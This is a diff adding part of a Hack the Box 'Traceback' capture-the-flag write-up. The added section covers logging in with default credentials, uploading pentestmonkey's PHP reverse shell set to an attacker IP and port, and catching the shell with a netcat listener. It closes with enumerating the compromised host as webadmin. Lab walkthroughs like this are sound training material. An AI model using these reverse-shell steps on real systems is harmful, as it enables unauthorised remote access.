@@ -159,7 +159,93 @@ I tried the credentials admin:admin and was able to login:
 
 ![portal](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/Traceback/Screenshots/portal.JPG)
 
-Looks like we can upload a reverse php shell to this location.  Lets use the 
+Looks like we can upload a reverse php shell to this location.  
+
+
+Lets upload the [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) from pentestmonkey to the webserver after we change the ip address and port to our attacking machine:
+
+```
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.15.224';  // CHANGE THIS
+$port = 12345;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+```
+
+Now that our reverse shell is on the server, let set up a netcat listener to catch a reverse shell:
+
+```
+nc -nlvp 12345
+```
+
+Now execute the reverse shell using curl:
+```
+curl http://10.10.10.181/php-reverse-shell.php
+```
+
+And we get a reverse shell as the user webadmin:
+```
+root@an0nym0us3:~/HTB/Traceback# nc -nlvp 12345
+listening on [any] 12345 ...
+connect to [10.10.14.146] from (UNKNOWN) [10.10.10.181] 40458
+Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 18:01:58 up 2 min,  0 users,  load average: 0.43, 0.24, 0.10
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+/bin/sh: 0: can't access tty; job control turned off
+```
+First lets get an interactive bash shell:
+```
+$ bash -i
+bash: cannot set terminal process group (521): Inappropriate ioctl for device
+bash: no job control in this shell
+webadmin@traceback:/$
+```
+
+Lets see what other users are on the machine:
+```
+webadmin@traceback:/home$ ls -la
+ls -la
+total 16
+drwxr-xr-x  4 root     root     4096 Aug 25  2019 .
+drwxr-xr-x 22 root     root     4096 Aug 25  2019 ..
+drwxr-x---  5 sysadmin sysadmin 4096 Mar 16 03:53 sysadmin
+drwxr-x---  5 webadmin sysadmin 4096 Mar 16 18:03 webadmin
+```
+
+Ok now lets see what is our home directory:
+```
+webadmin@traceback:/home/webadmin$ ls -la
+ls -la
+total 48
+drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 18:03 .
+drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
+-rw------- 1 webadmin webadmin  105 Mar 16 04:03 .bash_history
+-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
+-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
+drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
+drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
+-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
+-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
+drwxrwxr-x 2 webadmin webadmin 4096 Feb 27 06:29 .ssh
+-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt
+```
+
+No user.txt file.  Look at the note.txt:
+```
+cat note.txt
+- sysadmin -
+I have left a tool to practice Lua.
+I'm sure you know where to find it.
+Contact me if you have any question.
+```
+
+
 
 
 
